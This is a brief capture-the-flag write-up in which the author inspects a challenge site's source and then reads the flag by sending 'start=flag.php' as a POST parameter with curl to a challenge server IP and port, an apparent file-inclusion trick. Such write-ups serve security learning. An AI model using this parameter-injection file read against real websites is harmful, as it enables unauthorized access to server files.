after trying multiple methods, we check the source code of the website 
now we can try sending the flag.php value as POST start parameter through "guessing". 
curl is a cmd line tool for transferring data with URL 
and we get the flag by using curl 'ip/?start=' --data 'start=flag.php'

curl '35.246.152.131:31371/?start=' --data start=flag.php
